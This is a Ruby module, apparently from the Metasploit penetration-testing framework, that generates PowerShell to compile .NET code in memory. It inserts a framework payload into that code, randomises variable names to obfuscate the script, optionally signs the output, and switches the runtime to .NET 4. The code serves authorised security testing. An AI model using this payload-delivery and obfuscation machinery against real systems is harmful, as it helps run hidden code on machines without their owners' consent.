module Msf
class Post
module Windows

module Powershell
module DotNet

def dot_net_compiler(opts = {})
		#TODO: 
		# allow compilation entirely in memory with a b64 encoded product for export without disk access
		# Dynamically assign assemblies based on dot_net_code require/includes

		# Critical
		dot_net_code = opts[:harness]

		# Optional
		provider = opts[:provider] || 'Microsoft.CSharp.CSharpCodeProvider' # This should also work with 'Microsoft.VisualBasic.VBCodeProvider'
		target = opts[:target] # Unless building assemblies in memory only
		certificate = opts[:cert] # PFX certificate path
		payload = opts[:payload]

		assemblies = ["mscorlib.dll", "System.dll", "System.Xml.dll", "System.Data.dll"]
		opts[:assemblies] = [opts[:assemblies]] unless opts[:assemblies].is_a?(Array)
		assemblies += opts[:assemblies]
		assemblies =assemblies.uniq.compact

		compiler_opts = opts[:com_opts] || '/platform:x86 /optimize'

		if ::File.file?(dot_net_code)
			dot_net_code = ::File.read(dot_net_code)
		end

		if payload
			dot_net_code.gsub!('MSF_PAYLOAD_SPACE', payload)
		end

		var_gen_exe = target ? '$true' : '$false'

		# Obfu
		var_func = Rex::Text.rand_text_alpha(rand(8)+8)
		var_code = Rex::Text.rand_text_alpha(rand(8)+8)
		var_refs = Rex::Text.rand_text_alpha(rand(8)+8)
		var_provider = Rex::Text.rand_text_alpha(rand(8)+8)
		var_params = Rex::Text.rand_text_alpha(rand(8)+8)
		var_output = Rex::Text.rand_text_alpha(rand(8)+8)
		var_cert = Rex::Text.rand_text_alpha(rand(8)+8)

		compiler = <<EOS
function #{var_func} {
param (
[string[]] $#{var_code}       = $(throw "The parameter -code is required.")
, [string[]] $references = @()
)
$#{var_provider} = New-Object #{provider}
$#{var_params} = New-Object System.CodeDom.Compiler.CompilerParameters
@( "#{assemblies.join('", "')}", ([System.Reflection.Assembly]::GetAssembly( [PSObject] ).Location) ) | Sort -unique |% { $#{var_params}.ReferencedAssemblies.Add( $_ ) } | Out-Null
$#{var_params}.GenerateExecutable = #{var_gen_exe}
$#{var_params}.OutputAssembly = "#{target}"
$#{var_params}.GenerateInMemory   = $true
$#{var_params}.CompilerOptions = "#{compiler_opts}"
# $#{var_params}.IncludeDebugInformation = $true
$#{var_output} = $#{var_provider}.CompileAssemblyFromSource( $#{var_params}, $#{var_code} )
if ( $#{var_output}.Errors.Count -gt 0 ) {
$#{var_output}.Errors |% { Write-Error $_.ToString() }
} else { return $#{var_output}.CompiledAssembly}        
}
#{var_func} -#{var_code} @'
#{dot_net_code}
'@


EOS

		if certificate
			compiler += <<EOS
#{var_cert} = Get-PfxCertificate #{certificate}
Set-AuthenticodeSignature -Filepath #{target} -Cert #{var_cert}


EOS
		end
		# PS uses .NET 2.0 by default which doesnt work @ present (20120814, RLTM)
		return run_with_net4(compiler) 

	end

	def run_with_net4(ps_code)
		var_func = Rex::Text.rand_text_alpha(rand(8)+8)
		var_conf_path = Rex::Text.rand_text_alpha(rand(8)+8)
		var_env_name = Rex::Text.rand_text_alpha(rand(8)+8)
		var_env_old = Rex::Text.rand_text_alpha(rand(8)+8)

		exec_wrapper = <<EOS
function #{var_func} {
[CmdletBinding()]
param (
[Parameter(Mandatory=$true)]
[ScriptBlock]
$ScriptBlock,
[Parameter(ValueFromRemainingArguments=$true)]
[Alias('Args')]
[object[]]
$ArgumentList
)
if ($PSVersionTable.CLRVersion.Major -eq 4) {
Invoke-Command -ScriptBlock $ScriptBlock -ArgumentList $ArgumentList
return
}
$#{var_conf_path} = $Env:TEMP | Join-Path -ChildPath ([Guid]::NewGuid())
New-Item -Path $#{var_conf_path} -ItemType Container | Out-Null
@"
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
<startup useLegacyV2RuntimeActivationPolicy="true">
<supportedRuntime version="v4.0"/>
</startup>
</configuration>
"@ | Set-Content -Path $#{var_conf_path}/powershell.exe.activation_config -Encoding UTF8
$#{var_env_name} = 'COMPLUS_ApplicationMigrationRuntimeActivationConfigPath'
$#{var_env_old} = [Environment]::GetEnvironmentVariable($#{var_env_name})
[Environment]::SetEnvironmentVariable($#{var_env_name}, $#{var_conf_path})
try {
& powershell.exe -inputformat text -command $ScriptBlock -args $ArgumentList
} finally {
[Environment]::SetEnvironmentVariable($#{var_env_name}, $#{var_env_old})
$#{var_conf_path} | Remove-Item -Recurse
}
}
#{var_func} -ScriptBlock { 
#{ps_code}


}
EOS
	end
end; end; end; end; end
